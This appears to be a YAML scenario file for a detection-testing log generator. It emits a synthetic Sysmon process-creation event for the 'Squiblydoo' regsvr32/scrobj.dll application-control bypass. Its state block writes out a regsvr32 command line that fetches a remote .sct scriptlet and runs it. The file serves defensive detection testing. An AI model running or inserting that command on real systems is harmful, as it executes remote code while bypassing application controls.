type: scenario
description: |
  Defense evasion: regsvr32.exe (a trusted, signed Microsoft binary)
  is launched with a command line referencing scrobj.dll, the
  "Squiblydoo" application-control bypass. Sysmon EID 1 (Process
  Create) records the launch with the full CommandLine. Passing a
  remote or local .sct scriptlet plus the scrobj.dll COM scriptlet
  handler lets an attacker execute arbitrary script code under
  regsvr32.exe's trusted process name, bypassing controls that only
  block untrusted binaries. The command line is a state parameter so
  a job can drive both the scrobj.dll bypass and an unrelated,
  legitimate DLL registration that should not trip a detection scoped
  to scrobj.dll.
tags: [eid1]
mitre:
  tactics: [defense-evasion]
  techniques: [T1218.010]

state:
  domain_short:         CORP
  domain_tld:           local
  domain_short_lower:   fn.lower(ref.domain_short)
  domain_fqdn:          "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:             gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
  sysmon_pid:           gen.int(min=1000, max=4000)
  sysmon_tid:           gen.int(min=1000, max=9999)
  process_guid_raw:     gen.uuid()
  process_guid:         "{${ref.process_guid_raw}}"
  process_id:           gen.int(min=1000, max=9999)
  parent_guid_raw:      gen.uuid()
  parent_process_guid:  "{${ref.parent_guid_raw}}"
  parent_process_id:    gen.int(min=1000, max=9999)
  logon_guid_raw:       gen.uuid()
  logon_guid:           "{${ref.logon_guid_raw}}"
  logon_id_hex:         gen.hex(len=6)
  logon_id:             "0x${ref.logon_id_hex}"
  username:             gen.username()
  user:                 "${ref.domain_short}\\${ref.username}"
  current_directory:    "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
  event_record_id:      gen.int(min=5000, max=9999999)
  regsvr32_args:        "/s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
  command_line:         "C:\\Windows\\system32\\regsvr32.exe  ${ref.regsvr32_args} "
  parent_image:         "C:\\Windows\\System32\\cmd.exe"
  parent_command_line:  "\"C:\\Windows\\system32\\cmd.exe\" /c \"C:\\Windows\\system32\\regsvr32.exe ${ref.regsvr32_args}\" "

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": "C:\\Windows\\System32\\regsvr32.exe"
            - "@Name": FileVersion
              "#text": "10.0.18362.1 (WinBuild.160101.0800)"
            - "@Name": Description
              "#text": "Microsoft(C) Register Server"
            - "@Name": Product
              "#text": "Microsoft® Windows® Operating System"
            - "@Name": Company
              "#text": Microsoft Corporation
            - "@Name": OriginalFileName
              "#text": REGSVR32.EXE
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": 2
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
